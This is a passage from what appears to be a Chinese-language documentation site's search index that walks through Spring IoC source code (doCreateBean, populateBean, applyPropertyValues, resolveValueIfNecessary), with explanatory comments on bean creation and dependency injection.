mbd.getBeanClassName() != null) {\n        mbdToUse = new RootBeanDefinition(mbd);\n        mbdToUse.setBeanClass(resolvedClass);\n    }\n\n    // Prepare method overrides.\n    try {\n        mbdToUse.prepareMethodOverrides();\n    }\n    catch (BeanDefinitionValidationException ex) {\n        throw new BeanDefinitionStoreException(mbdToUse.getResourceDescription(),\n                beanName, \"Validation of method overrides failed\", ex);\n    }\n\n    try {\n        // Give BeanPostProcessors a chance to return a proxy instead of the target bean instance.\n        Object bean = resolveBeforeInstantiation(beanName, mbdToUse);\n        if (bean != null) {\n            return bean;\n        }\n    }\n    catch (Throwable ex) {\n        throw new BeanCreationException(mbdToUse.getResourceDescription(), beanName,\n                \"BeanPostProcessor before instantiation of bean failed\", ex);\n    }\n\n    try {\n        // createBean\u200b\u65b9\u6cd5\u200b\u7684\u200b\u6838\u5fc3\u200b  \u200b\u8be5\u200b\u65b9\u6cd5\u200b\u4f1a\u200b\u8fd4\u56de\u200bBean\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b9e\u4f8b\u200b\uff0c\u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5728\u200b\u4e0b\u9762\u200b\u8d34\u200b\u51fa\u200b\n        Object beanInstance = doCreateBean(beanName, mbdToUse, args);\n        if (logger.isTraceEnabled()) {\n            logger.trace(\"Finished creating instance of bean '\" + beanName + \"'\");\n        }\n        return beanInstance;\n    }\n    catch (BeanCreationException | ImplicitlyAppearedSingletonException ex) {\n        // A previously detected exception with proper bean creation context already,\n        // or illegal singleton state to be communicated up to DefaultSingletonBeanRegistry.\n        throw ex;\n    }\n    catch (Throwable ex) {\n        throw new BeanCreationException(\n                mbdToUse.getResourceDescription(), beanName, \"Unexpected exception during bean creation\", ex);\n    }\n}\n\n\n\n// \u200b\u5728\u200bAbstractAutowireCapableBeanFactory\u200b\u62bd\u8c61\u7c7b\u200b\u7684\u200bcreateBean\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200bdoCreateBean(beanName, mbdToUse, args)\u200b\u65b9\u6cd5\u200b\nprotected Object doCreateBean(final String beanName, final RootBeanDefinition mbd, final @Nullable Object[] args)\n        throws BeanCreationException {\n\n    // Instantiate the bean.\n    BeanWrapper instanceWrapper = null;\n    if (mbd.isSingleton()) {\n        instanceWrapper = this.factoryBeanInstanceCache.remove(beanName);\n    }\n    if (instanceWrapper == null) {\n        // \u200b\u521b\u5efa\u200bBean\u200b\u5b9e\u4f8b\u200b\n        instanceWrapper = createBeanInstance(beanName, mbd, args);\n    }\n    final Object bean = instanceWrapper.getWrappedInstance();\n    Class&lt;?&gt; beanType = instanceWrapper.getWrappedClass();\n    if (beanType != NullBean.class) {\n        mbd.resolvedTargetType = beanType;\n    }\n\n    // Allow post-processors to modify the merged bean definition.\n    synchronized (mbd.postProcessingLock) {\n        if (!mbd.postProcessed) {\n            try {\n                applyMergedBeanDefinitionPostProcessors(mbd, beanType, beanName);\n            }\n            catch (Throwable ex) {\n                throw new BeanCreationException(mbd.getResourceDescription(), beanName,\n                        \"Post-processing of merged bean definition failed\", ex);\n            }\n            mbd.postProcessed = true;\n        }\n    }\n\n    // Eagerly cache singletons to be able to resolve circular references\n    // even when triggered by lifecycle interfaces like BeanFactoryAware.\n    boolean earlySingletonExposure = (mbd.isSingleton() &amp;&amp; this.allowCircularReferences &amp;&amp;\n            isSingletonCurrentlyInCreation(beanName));\n    if (earlySingletonExposure) {\n        if (logger.isTraceEnabled()) {\n            logger.trace(\"Eagerly caching bean '\" + beanName +\n                    \"' to allow for resolving potential circular references\");\n        }\n        addSingletonFactory(beanName, () -&gt; getEarlyBeanReference(beanName, mbd, bean));\n    }\n\n    // Initialize the bean instance.\n    Object exposedObject = bean;\n    try {\n        // \u200b\u586b\u5145\u200bbean\uff0c\u200b\u5b9e\u9645\u200b\u8fdb\u884c\u200b\u4f9d\u8d56\u200b\u6ce8\u5165\u200b\u7684\u200b\u5730\u65b9\u200b\n        populateBean(beanName, mbd, instanceWrapper);\n        exposedObject = initializeBean(beanName, exposedObject, mbd);\n    }\n    catch (Throwable ex) {\n        if (ex instanceof BeanCreationException &amp;&amp; beanName.equals(((BeanCreationException) ex).getBeanName())) {\n            throw (BeanCreationException) ex;\n        }\n        else {\n            throw new BeanCreationException(\n                    mbd.getResourceDescription(), beanName, \"Initialization of bean failed\", ex);\n        }\n    }\n\n    if (earlySingletonExposure) {\n        Object earlySingletonReference = getSingleton(beanName, false);\n        if (earlySingletonReference != null) {\n            if (exposedObject == bean) {\n                exposedObject = earlySingletonReference;\n            }\n            else if (!this.allowRawInjectionDespiteWrapping &amp;&amp; hasDependentBean(beanName)) {\n                String[] dependentBeans = getDependentBeans(beanName);\n                Set&lt;String&gt; actualDependentBeans = new LinkedHashSet&lt;&gt;(dependentBeans.length);\n                for (String dependentBean : dependentBeans) {\n                    if (!removeSingletonIfCreatedForTypeCheckOnly(dependentBean)) {\n                        actualDependentBeans.add(dependentBean);\n                    }\n                }\n                if (!actualDependentBeans.isEmpty()) {\n                    throw new BeanCurrentlyInCreationException(beanName,\n                            \"Bean with name '\" + beanName + \"' has been injected into other beans [\" +\n                            StringUtils.collectionToCommaDelimitedString(actualDependentBeans) +\n                            \"] in its raw version as part of a circular reference, but has eventually been \" +\n                            \"wrapped. This means that said other beans do not use the final version of the \" +\n                            \"bean. This is often the result of over-eager type matching - consider using \" +\n                            \"'getBeanNamesOfType' with the 'allowEagerInit' flag turned off, for example.\");\n                }\n            }\n        }\n    }\n\n    // Register bean as disposable.\n    try {\n        registerDisposableBeanIfNecessary(beanName, bean, mbd);\n    }\n    catch (BeanDefinitionValidationException ex) {\n        throw new BeanCreationException(\n                mbd.getResourceDescription(), beanName, \"Invalid destruction signature\", ex);\n    }\n\n    return exposedObject;\n}\n\n\n// \u200b\u5728\u200bAbstractAutowireCapableBeanFactory\u200b\u62bd\u8c61\u7c7b\u200b\u7684\u200bdoCreateBean\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200b createBeanInstance(beanName, mbd, args)\u200b\u65b9\u6cd5\u200b\nprotected BeanWrapper createBeanInstance(String beanName, RootBeanDefinition mbd, @Nullable Object[] args) {\n    // Make sure bean class is actually resolved at this point.\n    Class&lt;?&gt; beanClass = resolveBeanClass(mbd, beanName);\n\n    if (beanClass != null &amp;&amp; !Modifier.isPublic(beanClass.getModifiers()) &amp;&amp; !mbd.isNonPublicAccessAllowed()) {\n        throw new BeanCreationException(mbd.getResourceDescription(), beanName,\n                \"Bean class isn't public, and non-public access not allowed: \" + beanClass.getName());\n    }\n\n    Supplier&lt;?&gt; instanceSupplier = mbd.getInstanceSupplier();\n    if (instanceSupplier != null) {\n        return obtainFromSupplier(instanceSupplier, beanName);\n    }\n\n    if (mbd.getFactoryMethodName() != null) {\n        return instantiateUsingFactoryMethod(beanName, mbd, args);\n    }\n\n    // Shortcut when re-creating the same bean...\n    boolean resolved = false;\n    boolean autowireNecessary = false;\n    if (args == null) {\n        synchronized (mbd.constructorArgumentLock) {\n            if (mbd.resolvedConstructorOrFactoryMethod != null) {\n                resolved = true;\n                autowireNecessary = mbd.constructorArgumentsResolved;\n            }\n        }\n    }\n    if (resolved) {\n        if (autowireNecessary) {\n            return autowireConstructor(beanName, mbd, null, null);\n        }\n        else {\n            // \u200b\u8c03\u7528\u200binstantiateBean\u200b\u65b9\u6cd5\u200b\n            return instantiateBean(beanName, mbd);\n        }\n    }\n\n    // Candidate constructors for autowiring?\n    Constructor&lt;?&gt;[] ctors = determineConstructorsFromBeanPostProcessors(beanClass, beanName);\n    if (ctors != null || mbd.getResolvedAutowireMode() == AUTOWIRE_CONSTRUCTOR ||\n            mbd.hasConstructorArgumentValues() || !ObjectUtils.isEmpty(args)) {\n        return autowireConstructor(beanName, mbd, ctors, args);\n    }\n\n    // Preferred constructors for default construction?\n    ctors = mbd.getPreferredConstructors();\n    if (ctors != null) {\n        return autowireConstructor(beanName, mbd, ctors, null);\n    }\n\n    // No special handling: simply use no-arg constructor.\n    return instantiateBean(beanName, mbd);\n}\n\n// \u200b\u5728\u200bAbstractAutowireCapableBeanFactory\u200b\u62bd\u8c61\u7c7b\u200b\u7684\u200bcreateBeanInstance\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200binstantiateBean(beanName, mbd)\u200b\u65b9\u6cd5\u200b\nprotected BeanWrapper instantiateBean(final String beanName, final RootBeanDefinition mbd) {\n    try {\n        Object beanInstance;\n        final BeanFactory parent = this;\n        if (System.getSecurityManager() != null) {\n            // \u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b\n            beanInstance = AccessController.doPrivileged((PrivilegedAction&lt;Object&gt;) () -&gt;\n                    getInstantiationStrategy().instantiate(mbd, beanName, parent),\n                    getAccessControlContext());\n        }\n        else {\n            // \u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b\n            beanInstance = getInstantiationStrategy().instantiate(mbd, beanName, parent);\n        }\n        BeanWrapper bw = new BeanWrapperImpl(beanInstance);\n        initBeanWrapper(bw);\n        return bw;\n    }\n    catch (Throwable ex) {\n        throw new BeanCreationException(\n                mbd.getResourceDescription(), beanName, \"Instantiation of bean failed\", ex);\n    }\n}\n\n// \u200b\u4e0a\u9762\u200b\u7684\u200bgetInstantiationStrategy()\u200b\u65b9\u6cd5\u200b\u4ee3\u7801\u200b\nprotected InstantiationStrategy getInstantiationStrategy() {\n    return this.instantiationStrategy;\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#getinstantiationstrategysimpleinstantiationstrategy","title":"getInstantiationStrategy()\u200b\u65b9\u6cd5\u200b\u7684\u200b\u8fd4\u56de\u200b\u63a5\u53e3\u200b\u5bf9\u8c61\u200b\u7684\u200b\u7b56\u7565\u200b\u5bf9\u8c61\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b9e\u73b0\u200bSimpleInstantiationStrategy","text":"<ul> <li>org.springframework.beans.factory.support.SimpleInstantiationStrategy</li> <li>SimpleInstantiationStrategy.instantiate(RootBeanDefinition bd, @Nullable String beanName, BeanFactory owner)\u200b\u65b9\u6cd5\u200b\u7684\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\uff1a Java<pre><code>@Override\npublic Object instantiate(RootBeanDefinition bd, @Nullable String beanName, BeanFactory owner) {\n    // Don't override the class with CGLIB if no overrides.\n    if (!bd.hasMethodOverrides()) {\n        Constructor&lt;?&gt; constructorToUse;\n        synchronized (bd.constructorArgumentLock) {\n            constructorToUse = (Constructor&lt;?&gt;) bd.resolvedConstructorOrFactoryMethod;\n            if (constructorToUse == null) {\n                final Class&lt;?&gt; clazz = bd.getBeanClass();\n                if (clazz.isInterface()) {\n                    throw new BeanInstantiationException(clazz, \"Specified class is an interface\");\n                }\n                try {\n                    if (System.getSecurityManager() != null) {\n                        constructorToUse = AccessController.doPrivileged(\n                                (PrivilegedExceptionAction&lt;Constructor&lt;?&gt;&gt;) clazz::getDeclaredConstructor);\n                    }\n                    else {\n                        constructorToUse = clazz.getDeclaredConstructor();\n                    }\n                    bd.resolvedConstructorOrFactoryMethod = constructorToUse;\n                }\n                catch (Throwable ex) {\n                    throw new BeanInstantiationException(clazz, \"No default constructor found\", ex);\n                }\n            }\n        }\n        // \u200b\u8c03\u7528\u200b\u9759\u6001\u65b9\u6cd5\u200bBeanUtils.instantiateClass(constructorToUse);\n        return BeanUtils.instantiateClass(constructorToUse);\n    }\n    else {\n        // Must generate CGLIB subclass.\n        return instantiateWithMethodInjection(bd, beanName, owner);\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#beanutilsinstantiateclassconstructortouse","title":"\u9759\u6001\u65b9\u6cd5\u200bBeanUtils.instantiateClass(constructorToUse)\u200b\u7684\u200b\u5b9e\u73b0\u200b\u7ec6\u8282","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.BeanUtils Java<pre><code>public static &lt;T&gt; T instantiateClass(Constructor&lt;T&gt; ctor, Object... args) throws BeanInstantiationException {\n    Assert.notNull(ctor, \"Constructor must not be null\");\n    try {\n        ReflectionUtils.makeAccessible(ctor);\n        // \u200b\u5224\u65ad\u200b\u662f\u5426\u662f\u200bKotlin\u200b\u7c7b\u578b\u200b\n        if (KotlinDetector.isKotlinReflectPresent() &amp;&amp; KotlinDetector.isKotlinType(ctor.getDeclaringClass())) {\n            // \u200b\u662f\u200bKotlin\u200b\u7c7b\u578b\u200b\n            return KotlinDelegate.instantiateClass(ctor, args);\n        }\n        else {\n            // \u200b\u4e0d\u662f\u200bKotlin\u200b\u7c7b\u578b\u200b\n            Class&lt;?&gt;[] parameterTypes = ctor.getParameterTypes();\n            Assert.isTrue(args.length &lt;= parameterTypes.length, \"Can't specify more arguments than constructor parameters\");\n            Object[] argsWithDefaultValues = new Object[args.length];\n            for (int i = 0 ; i &lt; args.length; i++) {\n                if (args[i] == null) {\n                    Class&lt;?&gt; parameterType = parameterTypes[i];\n                    argsWithDefaultValues[i] = (parameterType.isPrimitive() ? DEFAULT_TYPE_VALUES.get(parameterType) : null);\n                }\n                else {\n                    argsWithDefaultValues[i] = args[i];\n                }\n            }\n            // \u200b\u8c03\u7528\u200bConstructor\u200b\u7684\u200bnewInstance\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u4f7f\u7528\u200b\u53cd\u5c04\u200b\u521b\u5efa\u200b\u5b9e\u4f8b\u200b\n            // \u200b\u5230\u200b\u6b64\u200b\u4e4b\u540e\u200bbean\u200b\u5b9e\u4f8b\u200b\u521b\u5efa\u200b\u5b8c\u6210\u200b\n            return ctor.newInstance(argsWithDefaultValues);\n        }\n    }\n    catch (InstantiationException ex) {\n        throw new BeanInstantiationException(ctor, \"Is it an abstract class?\", ex);\n    }\n    catch (IllegalAccessException ex) {\n        throw new BeanInstantiationException(ctor, \"Is the constructor accessible?\", ex);\n    }\n    catch (IllegalArgumentException ex) {\n        throw new BeanInstantiationException(ctor, \"Illegal arguments for constructor\", ex);\n    }\n    catch (InvocationTargetException ex) {\n        throw new BeanInstantiationException(ctor, \"Constructor threw exception\", ex.getTargetException());\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#abstractautowirecapablebeanfactorydocreatebeanpopulatebeanbeanname-mbd-instancewrapper","title":"AbstractAutowireCapableBeanFactory\u200b\u62bd\u8c61\u7c7b\u200b\u7684\u200b\u4e2d\u200bdoCreateBean\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200bpopulateBean(beanName, mbd, instanceWrapper)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u5728\u200bAbstractAutowireCapableBeanFactory\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u7684\u200b\u65b9\u6cd5\u200bpopulateBean\u200b\u65b9\u6cd5\u200b</li> <li>\u200b\u8be5\u200b\u65b9\u6cd5\u200b\u7528\u4e8e\u200b\u586b\u5145\u200bbean \u200b\u5177\u4f53\u200b\u53d1\u751f\u200b\u4f9d\u8d56\u200b\u6ce8\u5165\u200b\u7684\u200b\u5730\u65b9\u200b Java<pre><code>@SuppressWarnings(\"deprecation\")  // for postProcessPropertyValues\nprotected void populateBean(String beanName, RootBeanDefinition mbd, @Nullable BeanWrapper bw) {\n    if (bw == null) {\n        if (mbd.hasPropertyValues()) {\n            throw new BeanCreationException(\n                    mbd.getResourceDescription(), beanName, \"Cannot apply property values to null instance\");\n        }\n        else {\n            // Skip property population phase for null instance.\n            return;\n        }\n    }\n\n    // Give any InstantiationAwareBeanPostProcessors the opportunity to modify the\n    // state of the bean before properties are set. This can be used, for example,\n    // to support styles of field injection.\n    boolean continueWithPropertyPopulation = true;\n\n    if (!mbd.isSynthetic() &amp;&amp; hasInstantiationAwareBeanPostProcessors()) {\n        for (BeanPostProcessor bp : getBeanPostProcessors()) {\n            if (bp instanceof InstantiationAwareBeanPostProcessor) {\n                InstantiationAwareBeanPostProcessor ibp = (InstantiationAwareBeanPostProcessor) bp;\n                if (!ibp.postProcessAfterInstantiation(bw.getWrappedInstance(), beanName)) {\n                    continueWithPropertyPopulation = false;\n                    break;\n                }\n            }\n        }\n    }\n\n    if (!continueWithPropertyPopulation) {\n        return;\n    }\n    // \u200b\u83b7\u53d6\u200bbean\u200b\u7684\u200b\u6240\u6709\u200b\u5c5e\u6027\u200b \u200b\u7528\u4e8e\u200b\u540e\u9762\u200b\u914d\u7f6e\u200bProperty\u200b\u5143\u7d20\u200b \u200b\u5373\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\n    PropertyValues pvs = (mbd.hasPropertyValues() ? mbd.getPropertyValues() : null);\n\n    int resolvedAutowireMode = mbd.getResolvedAutowireMode();\n    if (resolvedAutowireMode == AUTOWIRE_BY_NAME || resolvedAutowireMode == AUTOWIRE_BY_TYPE) {\n        MutablePropertyValues newPvs = new MutablePropertyValues(pvs);\n        // Add property values based on autowire by name if applicable.\n        if (resolvedAutowireMode == AUTOWIRE_BY_NAME) {\n            autowireByName(beanName, mbd, bw, newPvs);\n        }\n        // Add property values based on autowire by type if applicable.\n        if (resolvedAutowireMode == AUTOWIRE_BY_TYPE) {\n            autowireByType(beanName, mbd, bw, newPvs);\n        }\n        pvs = newPvs;\n    }\n\n    boolean hasInstAwareBpps = hasInstantiationAwareBeanPostProcessors();\n    boolean needsDepCheck = (mbd.getDependencyCheck() != AbstractBeanDefinition.DEPENDENCY_CHECK_NONE);\n\n    PropertyDescriptor[] filteredPds = null;\n    if (hasInstAwareBpps) {\n        if (pvs == null) {\n            pvs = mbd.getPropertyValues();\n        }\n        for (BeanPostProcessor bp : getBeanPostProcessors()) {\n            if (bp instanceof InstantiationAwareBeanPostProcessor) {\n                InstantiationAwareBeanPostProcessor ibp = (InstantiationAwareBeanPostProcessor) bp;\n                PropertyValues pvsToUse = ibp.postProcessProperties(pvs, bw.getWrappedInstance(), beanName);\n                if (pvsToUse == null) {\n                    if (filteredPds == null) {\n                        filteredPds = filterPropertyDescriptorsForDependencyCheck(bw, mbd.allowCaching);\n                    }\n                    pvsToUse = ibp.postProcessPropertyValues(pvs, filteredPds, bw.getWrappedInstance(), beanName);\n                    if (pvsToUse == null) {\n                        return;\n                    }\n                }\n                pvs = pvsToUse;\n            }\n        }\n    }\n    if (needsDepCheck) {\n        if (filteredPds == null) {\n            filteredPds = filterPropertyDescriptorsForDependencyCheck(bw, mbd.allowCaching);\n        }\n        checkDependencies(beanName, mbd, filteredPds, pvs);\n    }\n\n    if (pvs != null) {\n        // \u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b applyPropertyValues\u200b\u65b9\u6cd5\u200b\u7684\u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5728\u200b\u4e0b\u9762\u200b\n        applyPropertyValues(beanName, mbd, bw, pvs);\n    }\n}\n\n// \u200b\u4e0a\u9762\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200bapplyPropertyValues\u200b\u65b9\u6cd5\u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\nprotected void applyPropertyValues(String beanName, BeanDefinition mbd, BeanWrapper bw, PropertyValues pvs) {\n    if (pvs.isEmpty()) {\n        return;\n    }\n\n    if (System.getSecurityManager() != null &amp;&amp; bw instanceof BeanWrapperImpl) {\n        ((BeanWrapperImpl) bw).setSecurityContext(getAccessControlContext());\n    }\n\n    MutablePropertyValues mpvs = null;\n    List&lt;PropertyValue&gt; original;\n\n    if (pvs instanceof MutablePropertyValues) {\n        mpvs = (MutablePropertyValues) pvs;\n        if (mpvs.isConverted()) {\n            // Shortcut: use the pre-converted values as-is.\n            try {\n                bw.setPropertyValues(mpvs);\n                return;\n            }\n            catch (BeansException ex) {\n                throw new BeanCreationException(\n                        mbd.getResourceDescription(), beanName, \"Error setting property values\", ex);\n            }\n        }\n        original = mpvs.getPropertyValueList();\n    }\n    else {\n        original = Arrays.asList(pvs.getPropertyValues());\n    }\n\n    TypeConverter converter = getCustomTypeConverter();\n    if (converter == null) {\n        converter = bw;\n    }\n    BeanDefinitionValueResolver valueResolver = new BeanDefinitionValueResolver(this, beanName, mbd, converter);\n\n    // Create a deep copy, resolving any references for values.\n    List&lt;PropertyValue&gt; deepCopy = new ArrayList&lt;&gt;(original.size());\n    boolean resolveNecessary = false;\n    for (PropertyValue pv : original) {\n        if (pv.isConverted()) {\n            deepCopy.add(pv);\n        }\n        else {\n            String propertyName = pv.getName();\n            Object originalValue = pv.getValue();\n            if (originalValue == AutowiredPropertyMarker.INSTANCE) {\n                Method writeMethod = bw.getPropertyDescriptor(propertyName).getWriteMethod();\n                if (writeMethod == null) {\n                    throw new IllegalArgumentException(\"Autowire marker for property without write method: \" + pv);\n                }\n                originalValue = new DependencyDescriptor(new MethodParameter(writeMethod, 0), true);\n            }\n            // \u200b\u83b7\u53d6\u200bproperty\u200b\u5bf9\u5e94\u200b\u7684\u200b\u503c\u200b   resolveValueIfNecessary\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4ee3\u7801\u200b\u5728\u200b\u4e0b\u9762\u200b\u7ed9\u51fa\u200b\n            Object resolvedValue = valueResolver.resolveValueIfNecessary(pv, originalValue);\n            Object convertedValue = resolvedValue;\n            boolean convertible = bw.isWritableProperty(propertyName) &amp;&amp;\n                    !PropertyAccessorUtils.isNestedOrIndexedProperty(propertyName);\n            if (convertible) {\n                convertedValue = convertForProperty(resolvedValue, propertyName, bw, converter);\n            }\n            // Possibly store converted value in merged bean definition,\n            // in order to avoid re-conversion for every created bean instance.\n            if (resolvedValue == originalValue) {\n                if (convertible) {\n                    pv.setConvertedValue(convertedValue);\n                }\n                deepCopy.add(pv);\n            }\n            else if (convertible &amp;&amp; originalValue instanceof TypedStringValue &amp;&amp;\n                    !((TypedStringValue) originalValue).isDynamic() &amp;&amp;\n                    !(convertedValue instanceof Collection || ObjectUtils.isArray(convertedValue))) {\n                pv.setConvertedValue(convertedValue);\n                deepCopy.add(pv);\n            }\n            else {\n                resolveNecessary = true;\n                deepCopy.add(new PropertyValue(pv, convertedValue));\n            }\n        }\n    }\n    if (mpvs != null &amp;&amp; !resolveNecessary) {\n        mpvs.setConverted();\n    }\n\n    // Set our (possibly massaged) deep copy.\n    try {\n        // \u200b\u83b7\u53d6\u200b\u5230\u200b\u4f9d\u8d56\u200b\u7684\u200b\u5bf9\u8c61\u200b\u503c\u540e\u200b \u200b\u5c06\u200b\u4f9d\u8d56\u200b\u503c\u200b\u6ce8\u5165\u200b\n        bw.setPropertyValues(new MutablePropertyValues(deepCopy));\n    }\n    catch (BeansException ex) {\n        throw new BeanCreationException(\n                mbd.getResourceDescription(), beanName, \"Error setting property values\", ex);\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#33","title":"##############################################################################################################################################33","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#valueresolverresolvevalueifnecessarypv-originalvalue","title":"valueResolver.resolveValueIfNecessary(pv, originalValue);\u200b\u5bf9\u5e94\u200b\u7684\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.factory.support.BeanDefinitionValueResolver Java<pre><code>@Nullable\npublic Object resolveValueIfNecessary(Object argName, @Nullable Object value) {\n    // We must check each value to see whether it requires a runtime reference\n    // to another bean to be resolved.\n    if (value instanceof RuntimeBeanReference) {\n        RuntimeBeanReference ref = (RuntimeBeanReference) value;\n        // \u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b \u200b\u89e3\u51b3\u200bBean\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b \u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5728\u200b\u4e0b\u65b9\u200b\u8d34\u200b\u51fa\u200b\n        return resolveReference(argName, ref);\n    }\n    else if (value instanceof RuntimeBeanNameReference) {\n        String refName = ((RuntimeBeanNameReference) value).getBeanName();\n        refName = String.valueOf(doEvaluate(refName));\n        if (!this.beanFactory.containsBean(refName)) {\n            throw new BeanDefinitionStoreException(\n                    \"Invalid bean name '\" + refName + \"' in bean reference for \" + argName);\n        }\n        return refName;\n    }\n    else if (value instanceof BeanDefinitionHolder) {\n        // Resolve BeanDefinitionHolder: contains BeanDefinition with name and aliases.\n        BeanDefinitionHolder bdHolder = (BeanDefinitionHolder) value;\n        return resolveInnerBean(argName, bdHolder.getBeanName(), bdHolder.getBeanDefinition());\n    }\n    else if (value instanceof BeanDefinition) {\n        // Resolve plain BeanDefinition, without contained name: use dummy name.\n        BeanDefinition bd = (BeanDefinition) value;\n        String innerBeanName = \"(inner bean)\" + BeanFactoryUtils.GENERATED_BEAN_NAME_SEPARATOR +\n                ObjectUtils.getIdentityHexString(bd);\n        return resolveInnerBean(argName, innerBeanName, bd);\n    }\n    else if (value instanceof DependencyDescriptor) {\n        Set&lt;String&gt; autowiredBeanNames = new LinkedHashSet&lt;&gt;(4);\n        Object result = this.beanFactory.resolveDependency(\n                (DependencyDescriptor) value, this.beanName, autowiredBeanNames, this.typeConverter);\n        for (String autowiredBeanName : autowiredBeanNames) {\n            if (this.beanFactory.containsBean(autowiredBeanName)) {\n                this.beanFactory.registerDependentBean(autowiredBeanName, this.beanName);\n            }\n        }\n        return result;\n    }\n    else if (value instanceof ManagedArray) {\n        // May need to resolve contained runtime references.\n        ManagedArray array = (ManagedArray) value;\n        Class&lt;?&gt; elementType = array.resolvedElementType;\n        if (elementType == null) {\n            String elementTypeName = array.getElementTypeName();\n            if (StringUtils.hasText(elementTypeName)) {\n                try {\n                    elementType = ClassUtils.forName(elementTypeName, this.beanFactory.getBeanClassLoader());\n                    array.resolvedElementType = elementType;\n                }\n                catch (Throwable ex) {\n                    // Improve the message by showing the context.\n                    throw new BeanCreationException(\n                            this.beanDefinition.getResourceDescription(), this.beanName,\n                            \"Error resolving array type for \" + argName, ex);\n                }\n            }\n            else {\n                elementType = Object.class;\n            }\n        }\n        return resolveManagedArray(argName, (List&lt;?&gt;) value, elementType);\n    }\n    else if (value instanceof ManagedList) {\n        // May need to resolve contained runtime references.\n        return resolveManagedList(argName, (List&lt;?&gt;) value);\n    }\n    else if (value instanceof ManagedSet) {\n        // May need to resolve contained runtime references.\n        return resolveManagedSet(argName, (Set&lt;?&gt;) value);\n    }\n    else if (value instanceof ManagedMap) {\n        // May need to resolve contained runtime references.\n        return resolveManagedMap(argName, (Map&lt;?, ?&gt;) value);\n    }\n    else if (value instanceof ManagedProperties) {\n        Properties original = (Properties) value;\n        Properties copy = new Properties();\n        original.forEach((propKey, propValue) -&gt; {\n            if (propKey instanceof TypedStringValue) {\n                propKey = evaluate((TypedStringValue) propKey);\n            }\n            if (propValue instanceof TypedStringValue) {\n                propValue = evaluate((TypedStringValue) propValue);\n            }\n            if (propKey == null || propValue == null) {\n                throw new BeanCreationException(\n                        this.beanDefinition.getResourceDescription(), this.beanName,\n                        \"Error converting Properties key/value pair for \" + argName + \": resolved to null\");\n            }\n            copy.put(propKey, propValue);\n        });\n        return copy;\n    }\n    else if (value instanceof TypedStringValue) {\n        // Convert value to target type here.\n        TypedStringValue typedStringValue = (TypedStringValue) value;\n        Object valueObject = evaluate(typedStringValue);\n        try {\n            Class&lt;?&gt; resolvedTargetType = resolveTargetType(typedStringValue);\n            if (resolvedTargetType != null) {\n                return this.typeConverter.convertIfNecessary(valueObject, resolvedTargetType);\n            }\n            else {\n                return valueObject;\n            }\n        }\n        catch (Throwable ex) {\n            // Improve the message by showing the context.\n            throw new BeanCreationException(\n                    this.beanDefinition.getResourceDescription(), this.beanName,\n                    \"Error converting typed String value for \" + argName, ex);\n        }\n    }\n    else if (value instanceof NullBean) {\n        return null;\n    }\n    else {\n        return evaluate(value);\n    }\n}\n\n\n// \u200b\u4e0a\u9762\u200bresolveValueIfNecessary\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200bresolveReference\u200b\u65b9\u6cd5\u200b\n// \u200b\u6700\u540e\u200b\u83b7\u53d6\u200b\u5230\u200b\u4f9d\u8d56\u200b\u7684\u200bbean\n@Nullable\nprivate Object resolveReference(Object argName, RuntimeBeanReference ref) {\n    try {\n        Object bean;\n        Class&lt;?&gt; beanType = ref.getBeanType();\n        if (ref.isToParent()) {\n            BeanFactory parent = this.beanFactory.getParentBeanFactory();\n            if (parent == null) {\n                throw new BeanCreationException(\n                        this.beanDefinition.getResourceDescription(), this.beanName,\n                        \"Cannot resolve reference to bean \" + ref +\n                                \" in parent factory: no parent factory available\");\n            }\n            if (beanType != null) {\n                // \u200b\u53d1\u751f\u200b\u9012\u5f52\u200b\u8c03\u7528\u200b\n                bean = parent.getBean(beanType);\n            }\n            else {\n                // \u200b\u53d1\u751f\u200b\u9012\u5f52\u200b\u8c03\u7528\u200b \u200b\u6839\u636e\u200b\u4f9d\u8d56\u200b\u7684\u200b\u540d\u79f0\u200b\u4ece\u200bBeanFactory\u200b\u4e2d\u200b\u9012\u5f52\u200b\u5f97\u5230\u200b\u4f9d\u8d56\u200b \u200b\u6700\u540e\u200b\u83b7\u53d6\u200b\u5230\u200b\u4f9d\u8d56\u200b\u7684\u200bbean\n                bean = parent.getBean(String.valueOf(doEvaluate(ref.getBeanName())));\n            }\n        }\n        else {\n            String resolvedName;\n            if (beanType != null) {\n                NamedBeanHolder&lt;?&gt; namedBean = this.beanFactory.resolveNamedBean(beanType);\n                bean = 